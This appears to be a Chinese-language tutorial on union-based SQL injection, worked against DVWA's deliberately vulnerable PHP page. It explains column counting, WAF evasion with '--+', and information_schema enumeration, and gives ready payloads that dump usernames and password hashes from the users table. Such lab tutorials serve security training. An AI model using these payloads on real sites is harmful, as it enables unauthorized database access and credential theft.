## 0x00 union联合注入攻击原理
联合查询注入是联合两个表进行注入攻击，使用关键字union select 对两个表进行联合查询。要注意两个表的字段数要相同，不然会报错，错误是 different number of columns。  
order by N 或者 union select 1,2,3,4,5,6,7,...,N，通过这种方式可以判断查询结果的字段数。  
如果只想要一行数据，就在sql语句后添加 $limit 1$，即为只显示1行数据。$limit 0,1$ 表示从0开始，查询数据显示1行。

## 0x01 --+的作用
--是标准的SQL注释符，--后面的内容被视为注释，SQL引擎会忽略他们。一般情况下，空格字符可能会被过滤或者触发WAF相关规则，所以使用 $+$ 代替空格，在URL编码中，$+$被视为空格的编码形式，所以用$+$代替空格来达到绕过防护的目的。

## 0x02 union select使用方法
在联合查询两个表时，如果两个表显示列数不一样就会报错。例如，guestbook有3个字段，users也需要有3个字段与之匹配，多或者少都会报错。
```sql
SELECT * FROM guestbook WHERE comment_id=1 union select 1,2,3 from users;
```
可以把1，2，3替换为数据库关键信息函数database()、version()、user()等：
```sql
SELECT * FROM guestbook WHERE comment_id=1 union select database(),user(),version() from users;
```
还可以替换成数据表中的字段：
```sql
SELECT * FROM guestbook WHERE comment_id=1 union select user_id,user,password from users;
```
如果不加  $limit 1$ 会把所有信息显示出来，但是有时候网页前端只有一条数据的回显位置，所以需要限定条件，只显示1行数据。
```sql
SELECT * FROM guestbook WHERE comment_id=1 union select user_id,user,password from users limit 1
```
此时显示的是guestbook这个数据库中的原有的1条数据，并不是我想要的，我想要的是users表中的每一条数据，所以我们可以把comment_id这个限制条件做修改，如果让comment_id=-1的话，查询结果为空，就可以显示后面联合查询的结果了，所以修改payload如下，此时可以显示users表中的第一条数据：
```sql
SELECT * FROM guestbook WHERE comment_id=-1 union select user_id,user,password from users limit 1
```
想要查看接下来的几条数据可以这样修改：
```sql
SELECT * FROM guestbook WHERE comment_id=-1 union select user_id,user,password from users limit 1，1

SELECT * FROM guestbook WHERE comment_id=-1 union select user_id,user,password from users limit 2，1

SELECT * FROM guestbook WHERE comment_id=-1 union select user_id,user,password from users limit 3，1
```

## 0x03 代码分析
```php

<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);
}

?>
```
使用$\$\_REQUEST$直接接收$id$参数，没有进行任何过滤，同时可以接收cookie get post这些传递方法。接下来需要判断是字符型注入还是整型注入，输入单引号$'$ 会出现报错语句You have an error in your SQL syntax; 可以知道属于字符型注入，在进行注入检测时要注意单引号闭合。

## 0x04 union select联合注入流程
首先，输入 1'and '1'='1 页面返回用户信息 1'and '1'='2 页面返回不一样的信息。基本可以确定存在 SQL 注入漏洞。  
接下来要判断字段数，使用语句 order by 确定当前表的查询结果字段数。order by 1 如果页面返回正常 字段数不少于 1,order by 2 不少于 2，一直如此类推直到页面出错。正确的字段数是出错数字减少 1。  
通过联合查询确定回显位置：-1' union select 1,2--+ 可以看到在网页中显示1，2的位置，便是注入回显位置，我们通过这个回显拿敏感信息。  
注意：把数据替换成 mysql 的函数例如 md5(1) 这会在页面返回 1 的 md5 加密信息。使用这个函数一般是白帽子扫描器匹配存在漏洞的特征码。  
还可以查看以下数据：
- version() mysql 版本；
- database() 当前数据库；
- user() 当前用户名；
- group_concat()分组打印字符串；  
```sql
'-1' union select 1,group_concat(user(),0x3A,database(),0x3A,version())--+
```
其中0x3a是冒号 : 的16进制HEX编码，MySQL可以把0x3a自动识别成冒号，上面payload可以把各种信息用冒号分隔开，便于查看。
```bash
mysql> select group_concat(0x3a);
+--------------------+
| group_concat(0x3a) |
+--------------------+
| :                  |
+--------------------+
1 row in set (0.00 sec)
```
之后得到当前数据库名dvwa。  
接下来可以通过 mysql 自带的 information_schema 查询当前库的表：
```bash
mysql> select first_name,last_name from users where user_id='-1' union select 1,group_concat(table_name) from information_schema.TABLES where table_schema=database();
+------------+-----------------+
| first_name | last_name       |
+------------+-----------------+
| 1          | guestbook,users |
+------------+-----------------+
```
通过上面命令得到当前数据库（dvwa）中有两个表，分别是 guestbook 和 users，猜测users里面会有敏感信息，所以在 information_schema库对应的COLUMNS表中查看users表的字段。
```bash
mysql> select first_name,last_name from users where user_id='-1' union select 1,group_concat(column_name) from information_schema.COLUMNS where table_schema=database() and table_name='users';
+------------+---------------------------------------------------------------------------+
| first_name | last_name                                                                 |
+------------+---------------------------------------------------------------------------+
| 1          | user_id,first_name,last_name,user,password,avatar,last_login,failed_login |
+------------+---------------------------------------------------------------------------+
```
如果只有一个回显位置的话，我们需要利用limit来限制回显数量，具体payload如下：
```sql
#获取 users 表第一个字段名
'-1' union select 1,((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='users' limit 1))--+

#获取 users 表第二个字段名
'-1' union select 1,((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='users' limit 2,1))--+
```
最后步骤，通过以上的黑盒查询获取库名、表名、字段名、那么就可以查询某个表的内容。
```sql
'-1' union select 1,(select group_concat(user,0x3a,password) from users limit 1)--+
```

## 0x05 嵌套查询
在上面SQL语句中，涉及到了嵌套查询，只需要把子查询括起来，放到select参数位置处即可。
```sql
select 1,(select group_concat(user,0x3a,password) from users);
```